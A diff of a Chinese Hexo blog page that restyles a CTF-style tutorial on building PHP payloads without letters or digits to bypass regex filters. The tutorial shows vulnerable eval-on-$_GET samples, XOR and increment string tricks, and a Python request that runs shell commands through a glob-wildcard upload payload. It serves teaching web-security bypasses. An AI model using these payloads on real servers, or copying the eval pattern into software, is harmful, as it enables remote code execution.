@@ -1,127 +1,198 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-  <meta charset="utf-8">
-  
-  
-  <title>php无字母数字构造-入门级 | 人死后会去电影院</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="1    前置知识1.1    php中的正则匹配函数最常见的preg_grep() preg_grep(string $pattern, array $array, int $flags &#x3D; 0): array|false 返回给定数组array中与模式pattern 匹配的元素组成的数组 其余的正则函数可以在https:&#x2F;&#x2F;www.runoob.com&#x2F;php&#x2F;php-pcre.html里学习">
-<meta property="og:type" content="article">
-<meta property="og:title" content="php无字母数字构造-入门级">
-<meta property="og:url" content="http://example.com/2021/11/30/php%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0%E5%85%A5%E9%97%A8/index.html">
-<meta property="og:site_name" content="人死后会去电影院">
-<meta property="og:description" content="1    前置知识1.1    php中的正则匹配函数最常见的preg_grep() preg_grep(string $pattern, array $array, int $flags &#x3D; 0): array|false 返回给定数组array中与模式pattern 匹配的元素组成的数组 其余的正则函数可以在https:&#x2F;&#x2F;www.runoob.com&#x2F;php&#x2F;php-pcre.html里学习">
-<meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-11-29T16:08:08.000Z">
-<meta property="article:modified_time" content="2021-11-29T16:17:57.788Z">
-<meta property="article:author" content="AEQAQ">
-<meta property="article:tag" content="php">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="人死后会去电影院" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Keep Team">
     
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
-
-  
-  
+    <title>
+        
+            php无字母数字构造-入门级 |
+        
+        Keep Theme
+    </title>
+    
 <link rel="stylesheet" href="/css/style.css">
 
-  
+    <link rel="shortcut icon" href="/images/logo.svg">
     
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css">
 
-  
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    KEEP.theme_config = {"toc":{"enable":false,"number":false,"expand_all":false,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":false,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+  </script>
 <meta name="generator" content="Hexo 5.4.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">人死后会去电影院</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">沉淀</a>
-        </h2>
-      
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Keep Theme
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+        </ul>
     </div>
-  </div>
+
+    <div class="window-mask"></div>
+
 </header>
 
-      <div class="outer">
-        <section id="main"><article id="post-php无字母数字构造入门" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/11/30/php%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0%E5%85%A5%E9%97%A8/" class="article-date">
-  <time class="dt-published" datetime="2021-11-29T16:08:08.000Z" itemprop="datePublished">2021-11-30</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">php无字母数字构造-入门级</span>
+        </div>
+
         
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      php无字母数字构造-入门级
-    </h1>
-  
-
-      </header>
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Keep Team</span>
+                        
+                            <span class="author-label">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-11-30 00:08:08
+    </span>
     
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1    前置知识"></a>1    前置知识</h1><h2 id="1-1-php中的正则匹配函数"><a href="#1-1-php中的正则匹配函数" class="headerlink" title="1.1    php中的正则匹配函数"></a>1.1    php中的正则匹配函数</h2><p>最常见的preg_grep()</p>
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/php/">php</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1    前置知识"></a>1    前置知识</h1><h2 id="1-1-php中的正则匹配函数"><a href="#1-1-php中的正则匹配函数" class="headerlink" title="1.1    php中的正则匹配函数"></a>1.1    php中的正则匹配函数</h2><p>最常见的preg_grep()</p>
 <p>preg_grep(string $pattern, array $array, int $flags = 0): array|false</p>
 <p>返回给定数组array中与模式pattern 匹配的元素组成的数组</p>
-<p>其余的正则函数可以在<a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-pcre.html%E9%87%8C%E5%AD%A6%E4%B9%A0">https://www.runoob.com/php/php-pcre.html里学习</a></p>
-<h2 id="1-2-正则匹配式"><a href="#1-2-正则匹配式" class="headerlink" title="1.2     正则匹配式"></a>1.2     正则匹配式</h2><p>正则表达式手册：<a target="_blank" rel="noopener" href="https://tool.oschina.net/uploads/apidocs/jquery/regexp.html">https://tool.oschina.net/uploads/apidocs/jquery/regexp.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-tutorial.html">https://www.runoob.com/regexp/regexp-tutorial.html</a></p>
-<p>动态调试正则表达式的网站：<a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a></p>
-<p>中文在线调试：<a target="_blank" rel="noopener" href="https://c.runoob.com/front-end/854/">https://c.runoob.com/front-end/854/</a></p>
+<p>其余的正则函数可以在<a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/php/php-pcre.html%E9%87%8C%E5%AD%A6%E4%B9%A0" >https://www.runoob.com/php/php-pcre.html里学习<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="1-2-正则匹配式"><a href="#1-2-正则匹配式" class="headerlink" title="1.2     正则匹配式"></a>1.2     正则匹配式</h2><p>正则表达式手册：<a class="link"   target="_blank" rel="noopener" href="https://tool.oschina.net/uploads/apidocs/jquery/regexp.html" >https://tool.oschina.net/uploads/apidocs/jquery/regexp.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-tutorial.html" >https://www.runoob.com/regexp/regexp-tutorial.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>动态调试正则表达式的网站：<a class="link"   target="_blank" rel="noopener" href="https://regex101.com/" >https://regex101.com/<i class="fas fa-external-link-alt"></i></a></p>
+<p>中文在线调试：<a class="link"   target="_blank" rel="noopener" href="https://c.runoob.com/front-end/854/" >https://c.runoob.com/front-end/854/<i class="fas fa-external-link-alt"></i></a></p>
 <p>尝试阅读几个正则表达式：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/^[a-z0-9_-]&#123;3,16&#125;$/		用来过滤用户名</span><br><span class="line"></span><br><span class="line">/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/		匹配ip地址</span><br><span class="line"></span><br><span class="line">/^[a-z\d]+(\.[a-z\d]+)*@([\da-z](-[\da-z])?)+(\.&#123;1,2&#125;[a-z]+)+$/电子邮箱</span><br></pre></td></tr></table></figure>
 
 <h2 id="1-3-php中的位运算"><a href="#1-3-php中的位运算" class="headerlink" title="1.3    php中的位运算"></a>1.3    php中的位运算</h2><p>在构造字符绕正则的时候，我们常用位运算符来帮助我们构造</p>
-<p>php位运算符：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_28602957/article/details/52141431">https://blog.csdn.net/qq_28602957/article/details/52141431</a></p>
+<p>php位运算符：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_28602957/article/details/52141431" >https://blog.csdn.net/qq_28602957/article/details/52141431<i class="fas fa-external-link-alt"></i></a></p>
 <h1 id="2-无字母数字构造"><a href="#2-无字母数字构造" class="headerlink" title="2    无字母数字构造"></a>2    无字母数字构造</h1><h2 id="2-1-无字母数字基础"><a href="#2-1-无字母数字基础" class="headerlink" title="2.1    无字母数字基础"></a>2.1    无字母数字基础</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>php5</p>
-<p>修饰符i，s：<a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-flags.html">https://www.runoob.com/regexp/regexp-flags.html</a></p>
+<p>修饰符i，s：<a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-flags.html" >https://www.runoob.com/regexp/regexp-flags.html<i class="fas fa-external-link-alt"></i></a></p>
 </blockquote>
 <p><strong>异或拼接：</strong></p>
 <p>（来自p牛博客</p>
@@ -173,7 +244,7 @@
 
 <p><strong>自增：</strong></p>
 <p>‘a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p>
-<p>文档：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a></p>
+<p>文档：<a class="link"   target="_blank" rel="noopener" href="http://php.net/manual/zh/language.operators.increment.php" >http://php.net/manual/zh/language.operators.increment.php<i class="fas fa-external-link-alt"></i></a></p>
 <p>如何拿到一个值为字符串’a’的变量呢？</p>
 <p>数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
 <p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</p>
@@ -209,7 +280,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsurl=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span>files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;response=requests.post(url,files=files)html = response.textprint(html)</span><br></pre></td></tr></table></figure>
 
 <p>具体原理看p神文章可了解详细</p>
-<p>glob通配符：<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/glob.7.html">https://man7.org/linux/man-pages/man7/glob.7.html</a></p>
+<p>glob通配符：<a class="link"   target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/glob.7.html" >https://man7.org/linux/man-pages/man7/glob.7.html<i class="fas fa-external-link-alt"></i></a></p>
 <h2 id="2-3-过滤下划线"><a href="#2-3-过滤下划线" class="headerlink" title="2.3    过滤下划线"></a>2.3    过滤下划线</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">50</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;Too Long.&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_]+/&quot;</span>,<span class="variable">$code</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;Not Allowed.&quot;</span>);    &#125;    @<span class="keyword">eval</span>(<span class="variable">$code</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;<span class="comment">//$hint =  &quot;php function getFlag() to get flag&quot;;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 
@@ -242,141 +313,164 @@
 
 
 <p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/">https://ca01h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" >https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" >https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://ca01h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/" >https://ca01h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413" >https://blog.csdn.net/miuzzx/article/details/109143413<i class="fas fa-external-link-alt"></i></a></p>
 
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/30/php%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0%E5%85%A5%E9%97%A8/" data-id="ckwkvucfu0001sx340986aa3c" data-title="php无字母数字构造-入门级" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>
+        </div>
 
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-  
-    <a href="/2021/11/29/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">后一篇</strong>
-      <div class="article-nav-title">Hello World</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
         
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">分类</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li></ul>
-    </div>
-  </div>
 
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签云</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/php/" style="font-size: 10px;">php</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">归档</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget">
-      <ul>
         
-          <li>
-            <a href="/2021/11/30/php%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0%E5%85%A5%E9%97%A8/">php无字母数字构造-入门级</a>
-          </li>
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/11/29/hello-world/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Hello World</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
         
-          <li>
-            <a href="/2021/11/29/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
 
-  
-</aside>
         
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2021 AEQAQ<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
-  </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">Keep Team</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+        
+    </div>
 </footer>
 
+        </div>
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
     
 
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
 
-<script src="/js/jquery-3.4.1.min.js"></script>
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
 
 
 
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
 
 
 
 
-<script src="/js/script.js"></script>
 
 
 
 
+<div class="post-scripts">
+    
+</div>
 
-  </div>
+
+
 </body>
 </html>
